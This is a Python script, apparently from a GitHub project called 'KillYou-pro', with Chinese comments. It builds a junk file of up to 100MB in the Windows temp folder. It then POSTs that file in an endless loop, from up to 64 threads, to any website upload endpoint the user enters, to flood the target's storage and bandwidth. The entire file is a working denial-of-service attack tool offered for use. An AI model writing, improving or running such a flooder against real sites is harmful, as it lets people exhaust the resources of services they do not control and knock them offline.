# -*- coding: utf-8 -*-
import re
from urllib3 import encode_multipart_formdata
import requests
import threading
import os
import sys
import time


def upload(file_name, file_path):  # 实现上传主代码区
    global url
    with open(file_path, mode="r", encoding="utf8") as f:  # 以只读模式打开文件，编码utf-8
        file = {  # 创建file对象
            "file": (file_name, f.read()),
            "key": "value",
        }
        encode_data = encode_multipart_formdata(file)

        file_data = encode_data[0]

        headers_from_data = {
            "Content-Type": encode_data[1],
            # 认证token，如果上传文件不需要认证登录等可以不启用
            # "Authorization": 'token'
        }
        response = requests.post(url=url, headers=headers_from_data, data=file_data)  # 使用post请求上传文件
        return response


def input_shit_file_size():  # 输入要创建的临时文件大小 & 判断输入的类型
    global shit_file_size
    while True:
        try:
            shit_file_size = int(
                input('要创建的临时文件大小，建议10MB足够，最大不超过100MB '))  # 只允许输入整型，如果输入的不是整型，捕捉ValueError错误，重新输入
            # 用户输入的要创建的文件大小，单位MB
            break
        except ValueError:
            print('请输入正确的值')
    if int(shit_file_size) > 100:  # 判定用户输入的文件的大小如果大于100(MB)，就让用户重新输入文件大小
        print('你输入的值太大了！')
        input_shit_file_size()
    else:
        pass


def cleanup_file():
    while True:
        try:  # 捕获 FileNotFoundError 错误并在捕获后提示消息，无论捕获到了没有，都跳出两次循环继续执行下面的代码
            # 就是说，如果在试图清除文件的时候捕捉到了错误，就代表未找到之前生成的文件，直接可以继续生成了，如果没捕捉到错误，就代表已经把之前创建的文件删掉了，也可以继续生成新的文件
            os.remove(str((os.popen('echo %TEMP%').read().strip())) + '\\' + shit_file_name)
            print('已清理之前生成的文件！')
            # ↑清除之前创建的文件，避免用户想再次生成其他大小的文件而之前的文件已经存在导致无法生成用户想要大小的文件
            break
        except FileNotFoundError:
            print('未找到之前生成的文件呢~')
            break


def create_shit_file():  # 在 %TEMP% 目录创建文件
    global shit_file_name
    shit_file_name = 'shit_file_114514.txt'  # 要创建的文件的文件名
    input_shit_file_size()
    shit_file_size_b = int(shit_file_size) * 1048576  # 把用户输入的文件大小(MB) 转换为 字节
    cleanup_file()
    os.system(
        'fsutil file createnew %TEMP%\\' + shit_file_name + ' ' + str(shit_file_size_b))  # 创建一个10MB的空白txt文件
    if os.path.isfile(str((os.popen('echo %TEMP%').read().strip())) + str('\\') + shit_file_name) is True:
        print('文件创建成功，文件大小 %sMB  文件位置' % shit_file_size,
              str((os.popen('echo %TEMP%').read().strip())) + str('\\') + shit_file_name)
    else:
        print('文件创建失败，请尝试使用管理员权限运行！！')
        print('程序将在5s后自动退出...')
        time.sleep(5)
        sys.exit()


def thread_func():  # 单线程上传
    res = upload(shit_file_name, str((os.popen('echo %TEMP%').read().strip())) + str('\\') + shit_file_name)
    # 文件名+文件绝对路径
    print(res)  # 输出状态码


def input_thread():  # 输入值 & 判断输入的类型
    global count
    while True:
        try:
            count = int(input(
                '上传文件要使用的线程数量(正整数)  建议10线程足够，最大64线程  '))  # 只允许输入整型，如果输入的不是整型，捕捉错误ValueError，重新输入，
            # 是整型的话break跳出两次循环执行下面的代码
            break
        except ValueError:
            print('请输入正确的值')
    if count > 64:  # 如果输入的线程大于128重新输入
        print('输入的值太大了')
        input_thread()
    elif count > 0:  # 判断只允许大于0的整型，大于0直接跳出if循环，小于0提示消息然后重新从头判断
        pass
    else:
        print('请输入正确的值')
        input_thread()


def many_thread():  # 多线程上传 & 判断值
    input_thread()

    threads = []  # 创建一个空列表 等下用来写线程的
    for a in range(count):
        t = threading.Thread(target=thread_func())
        threads.append(t)
    for t in threads:
        t.start()


def input_url():
    global url
    url = input('输入文件上传接口 ')  # 设置要请求的上传接口
    if re.match(r"^((http://)|(https://))?([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}(/)", url) is \
            None:  # 通过正则表达式判断输入的接口是否为正确的网址
        print(
            '请输入正确的上传接口！ Example： http://xxxxxx.com/api/upload/  or  https://xxxxxx.com/api/upload/  注意最后要加\"/\"')
        input_url()
    else:
        pass


if __name__ == "__main__":
    print('我是一个垃圾文件上传工具QAQ')
    print('此工具可以通过HTTP post请求网站上传接口上传文件，支持http/https。 请确保上传接口输入正确！')
    print('启动后等几秒持续提示 \"<Response [200]>\" 就是已经在工作了')
    print('作者: haha44444')
    print('Github: https://github.com/haha44444/KillYou-pro')
    input_url()
    # global count, shit_file_name, shit_file_size, url
    create_shit_file()
    while True:
        many_thread()
